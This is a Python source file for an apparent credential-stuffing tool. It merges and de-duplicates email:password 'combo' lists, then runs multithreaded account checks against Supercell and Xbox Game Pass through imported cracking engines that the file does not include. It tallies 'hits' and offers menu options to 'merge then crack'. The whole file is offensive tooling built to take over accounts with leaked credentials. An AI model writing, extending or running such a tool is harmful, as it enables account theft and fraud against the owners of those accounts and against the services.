"""
File Merger System - Merge multiple combo files before cracking
Consolidates multiple files, removes duplicates, then starts checking
"""

import os
import json
import hashlib
from typing import Dict, List, Tuple, Set, Optional
from datetime import datetime


class FilesMerger:
    """Merge multiple combo files into one consolidated file"""
    
    def __init__(self, output_dir: str = "Merged_Combos"):
        self.output_dir = output_dir
        self.merged_file = os.path.join(output_dir, "merged_combos.txt")
        self.stats_file = os.path.join(output_dir, "merge_stats.json")
        self.duplicates_file = os.path.join(output_dir, "duplicates_removed.txt")
        
        # Ensure output directory exists
        os.makedirs(output_dir, exist_ok=True)
    
    @staticmethod
    def normalize_combo(combo: str) -> str:
        """Normalize combo format (email:password)"""
        combo = combo.strip()
        if ':' not in combo:
            return None
        return combo
    
    @staticmethod
    def hash_combo(combo: str) -> str:
        """Create hash of combo for duplicate detection"""
        return hashlib.md5(combo.encode()).hexdigest()
    
    def read_file(self, file_path: str) -> Tuple[List[str], int]:
        """Read combo file and return valid combos"""
        valid_combos = []
        invalid_count = 0
        
        try:
            if not os.path.exists(file_path):
                return [], 0
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    normalized = self.normalize_combo(line)
                    if normalized:
                        valid_combos.append(normalized)
                    else:
                        invalid_count += 1
        except Exception as e:
            print(f"⚠️  Error reading {file_path}: {e}")
            return [], invalid_count
        
        return valid_combos, invalid_count
    
    def merge_files(self, file_paths: List[str], remove_duplicates: bool = True) -> Dict[str, any]:
        """
        Merge multiple combo files into one
        
        Args:
            file_paths: List of file paths to merge
            remove_duplicates: Whether to remove duplicate combos
        
        Returns:
            Dictionary with merge statistics
        """
        print("\n" + "="*70)
        print("📁 STARTING FILE MERGER")
        print("="*70 + "\n")
        
        all_combos = []
        file_stats = {}
        total_invalid = 0
        
        # Read all files
        print(f"📂 Reading {len(file_paths)} file(s)...\n")
        for i, file_path in enumerate(file_paths, 1):
            print(f"   [{i}/{len(file_paths)}] Reading: {os.path.basename(file_path)}")
            combos, invalid = self.read_file(file_path)
            
            file_stats[file_path] = {
                "valid": len(combos),
                "invalid": invalid,
                "total": len(combos) + invalid
            }
            
            all_combos.extend(combos)
            total_invalid += invalid
            print(f"         ✓ {len(combos)} valid combos, {invalid} invalid")
        
        print(f"\n✅ Total loaded: {len(all_combos)} valid combos\n")
        
        # Remove duplicates if requested
        duplicate_count = 0
        removed_combos = []
        
        if remove_duplicates:
            print("🔍 Removing duplicates...")
            seen_hashes = set()
            unique_combos = []
            
            for combo in all_combos:
                combo_hash = self.hash_combo(combo)
                if combo_hash not in seen_hashes:
                    seen_hashes.add(combo_hash)
                    unique_combos.append(combo)
                else:
                    duplicate_count += 1
                    removed_combos.append(combo)
            
            all_combos = unique_combos
            print(f"✓ Removed {duplicate_count} duplicate combos\n")
        
        # Save merged file
        print(f"💾 Saving merged file to: {self.merged_file}")
        try:
            with open(self.merged_file, 'w', encoding='utf-8') as f:
                for combo in all_combos:
                    f.write(combo + '\n')
            print(f"✓ Merged file saved with {len(all_combos)} combos\n")
        except Exception as e:
            print(f"❌ Error saving merged file: {e}\n")
            return {"status": "error", "message": str(e)}
        
        # Save duplicates if any
        if removed_combos and remove_duplicates:
            try:
                with open(self.duplicates_file, 'w', encoding='utf-8') as f:
                    for combo in removed_combos:
                        f.write(combo + '\n')
                print(f"📝 Duplicate combos saved to: {self.duplicates_file}\n")
            except Exception as e:
                print(f"⚠️  Could not save duplicates: {e}")
        
        # Create statistics
        stats = {
            "timestamp": datetime.now().isoformat(),
            "files_merged": len(file_paths),
            "file_stats": file_stats,
            "total_loaded": sum(s["valid"] for s in file_stats.values()),
            "total_invalid": total_invalid,
            "duplicates_removed": duplicate_count,
            "final_count": len(all_combos),
            "merged_file": self.merged_file
        }
        
        # Save statistics
        try:
            with open(self.stats_file, 'w', encoding='utf-8') as f:
                json.dump(stats, f, indent=2)
        except Exception as e:
            print(f"⚠️  Could not save stats: {e}")
        
        # Print summary
        print("="*70)
        print("📊 MERGE SUMMARY")
        print("="*70)
        print(f"Files merged:           {len(file_paths)}")
        print(f"Total loaded:           {stats['total_loaded']}")
        print(f"Invalid combos:         {total_invalid}")
        print(f"Duplicates removed:     {duplicate_count}")
        print(f"Final unique combos:    {len(all_combos)}")
        print(f"Output file:            {self.merged_file}")
        print("="*70 + "\n")
        
        return {
            "status": "success",
            "stats": stats,
            "output_file": self.merged_file,
            "combo_count": len(all_combos)
        }
    
    def get_merge_stats(self) -> Optional[Dict]:
        """Get statistics from last merge"""
        try:
            if os.path.exists(self.stats_file):
                with open(self.stats_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except Exception:
            pass
        return None


class CombinedCracker:
    """Combined cracker system using merged files"""
    
    def __init__(self):
        self.merger = FilesMerger()
        self.supercell_engine = None
        self.xbox_engine = None
        
        # Try to import engines
        try:
            from supercell_engine import SupercellEngine
            self.supercell_engine = SupercellEngine()
        except ImportError:
            pass
        
        try:
            from xbox_engine import XboxEngine
            self.xbox_engine = XboxEngine()
        except ImportError:
            pass
    
    def merge_and_crack_supercell(self, file_paths: List[str], threads: int = 50) -> Dict[str, any]:
        """Merge files and start Supercell checking"""
        if not self.supercell_engine:
            return {"status": "error", "message": "Supercell engine not available"}
        
        print("\n🎮 SUPERCELL CRACKER - MERGE & CRACK MODE")
        
        # Merge files
        merge_result = self.merger.merge_files(file_paths, remove_duplicates=True)
        if merge_result["status"] != "success":
            return merge_result
        
        merged_file = merge_result["output_file"]
        combo_count = merge_result["combo_count"]
        
        # Start checking
        print(f"\n⚡ Starting Supercell check with {combo_count} combos using {threads} threads\n")
        
        checked = 0
        results = []
        
        try:
            with open(merged_file, 'r', encoding='utf-8') as f:
                combos = [line.strip() for line in f if ':' in line.strip()]
            
            from concurrent.futures import ThreadPoolExecutor, as_completed
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {
                    executor.submit(self.supercell_engine.check_account, 
                                  email.split(':')[0], 
                                  ':'.join(email.split(':')[1:])): email
                    for email in combos
                }
                
                for future in as_completed(futures):
                    try:
                        result = future.result(timeout=30)
                        if result:
                            results.append(result)
                    except Exception as e:
                        pass
                    finally:
                        checked += 1
                        if checked % 50 == 0:
                            stats = self.supercell_engine.get_stats()
                            print(f"Progress: {checked}/{combo_count} | Hits: {stats['total_hits']} | Supercell: {stats['supercell_hits']}")
            
            final_stats = self.supercell_engine.get_stats()
            
            return {
                "status": "completed",
                "engine": "supercell",
                "merged_file": merged_file,
                "total_checked": checked,
                "total_combos": combo_count,
                "results": results,
                "statistics": final_stats
            }
        
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def merge_and_crack_xbox(self, file_paths: List[str], threads: int = 50) -> Dict[str, any]:
        """Merge files and start Xbox checking"""
        if not self.xbox_engine:
            return {"status": "error", "message": "Xbox engine not available"}
        
        print("\n🎮 XBOX GAME PASS CRACKER - MERGE & CRACK MODE")
        
        # Merge files
        merge_result = self.merger.merge_files(file_paths, remove_duplicates=True)
        if merge_result["status"] != "success":
            return merge_result
        
        merged_file = merge_result["output_file"]
        combo_count = merge_result["combo_count"]
        
        # Start checking
        print(f"\n⚡ Starting Xbox check with {combo_count} combos using {threads} threads\n")
        
        checked = 0
        results = []
        
        try:
            with open(merged_file, 'r', encoding='utf-8') as f:
                combos = [line.strip() for line in f if ':' in line.strip()]
            
            from concurrent.futures import ThreadPoolExecutor, as_completed
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {
                    executor.submit(self.xbox_engine.check_account,
                                  email.split(':')[0],
                                  ':'.join(email.split(':')[1:])): email
                    for email in combos
                }
                
                for future in as_completed(futures):
                    try:
                        result = future.result(timeout=30)
                        if result:
                            results.append(result)
                    except Exception as e:
                        pass
                    finally:
                        checked += 1
                        if checked % 50 == 0:
                            stats = self.xbox_engine.get_stats()
                            print(f"Progress: {checked}/{combo_count} | Hits: {stats['total_hits']} | Game Pass: {stats['gamepass_hits']}")
            
            final_stats = self.xbox_engine.get_stats()
            
            return {
                "status": "completed",
                "engine": "xbox",
                "merged_file": merged_file,
                "total_checked": checked,
                "total_combos": combo_count,
                "results": results,
                "statistics": final_stats
            }
        
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def merge_and_crack_both(self, file_paths: List[str], threads_supercell: int = 30, 
                            threads_xbox: int = 30) -> Dict[str, any]:
        """Merge files and check with both engines sequentially"""
        print("\n🎮 DUAL ENGINE CRACKER - MERGE & CRACK MODE")
        print("Running Supercell first, then Xbox...\n")
        
        # Merge files
        merge_result = self.merger.merge_files(file_paths, remove_duplicates=True)
        if merge_result["status"] != "success":
            return merge_result
        
        results = {
            "merged_file": merge_result["output_file"],
            "supercell": self.merge_and_crack_supercell([merge_result["output_file"]], threads_supercell),
            "xbox": self.merge_and_crack_xbox([merge_result["output_file"]], threads_xbox)
        }
        
        return results


def display_merge_menu():
    """Display merge and crack menu"""
    print("\n" + "="*70)
    print("🔀 FILE MERGER & CRACKER SYSTEM")
    print("="*70)
    print("\nOptions:")
    print("  1. Merge files then crack (Supercell)")
    print("  2. Merge files then crack (Xbox)")
    print("  3. Merge files then crack (Both engines)")
    print("  4. Just merge files (no cracking)")
    print("  0. Back to main menu")
    print("\n" + "="*70)
    
    choice = input("\nSelect option (0-4): ").strip()
    return choice


def handle_merge_files():
    """Handle file merging and cracking"""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    
    cracker = CombinedCracker()
    
    while True:
        choice = display_merge_menu()
        
        if choice == "0":
            break
        
        elif choice in ["1", "2", "3", "4"]:
            # Get input files
            print("\n📂 Enter file paths (comma-separated, or 'browse' to select files):")
            print("   Example: combo1.txt, combo2.txt, combo3.txt")
            user_input = input("Files: ").strip()
            
            if user_input.lower() == "browse":
                # Browse for files
                print("\n🔍 Searching for combo files in current directory...")
                combo_files = [f for f in os.listdir(".") if f.endswith(".txt") and "combo" in f.lower()]
                if not combo_files:
                    print("❌ No combo files found")
                    continue
                
                print(f"\n📁 Found {len(combo_files)} combo file(s):")
                for i, f in enumerate(combo_files, 1):
                    print(f"   {i}. {f}")
                
                file_paths = combo_files
            else:
                # Parse manually entered files
                file_paths = [f.strip() for f in user_input.split(",") if f.strip()]
            
            if not file_paths:
                print("❌ No files specified")
                continue
            
            # Verify files exist
            valid_paths = []
            for path in file_paths:
                if os.path.exists(path):
                    valid_paths.append(path)
                else:
                    print(f"⚠️  File not found: {path}")
            
            if not valid_paths:
                print("❌ No valid files found")
                continue
            
            print(f"\n✅ Using {len(valid_paths)} file(s)")
            
            # Get thread count
            if choice != "4":
                try:
                    threads = int(input("\n🧵 Thread count (default 50): ").strip() or "50")
                except ValueError:
                    threads = 50
            
            # Execute based on choice
            if choice == "1":
                result = cracker.merge_and_crack_supercell(valid_paths, threads)
                print(f"\n✅ Completed: {result['statistics']['total_hits']} hits")
            
            elif choice == "2":
                result = cracker.merge_and_crack_xbox(valid_paths, threads)
                print(f"\n✅ Completed: {result['statistics']['total_hits']} hits")
            
            elif choice == "3":
                results = cracker.merge_and_crack_both(valid_paths, threads, threads)
                print(f"\n✅ Supercell hits: {results['supercell']['statistics']['total_hits']}")
                print(f"✅ Xbox hits: {results['xbox']['statistics']['total_hits']}")
            
            elif choice == "4":
                result = cracker.merger.merge_files(valid_paths, remove_duplicates=True)
                if result["status"] == "success":
                    print(f"\n✅ Merged successfully!")
                    print(f"📁 Output: {result['output_file']}")
                    print(f"📊 Total combos: {result['combo_count']}")
        
        else:
            print("❌ Invalid option")


if __name__ == "__main__":
    print("File Merger System - Test Mode")
    
    # Test example
    merger = FilesMerger()
    print("Ready for use. Call handle_merge_files() to start merging.")
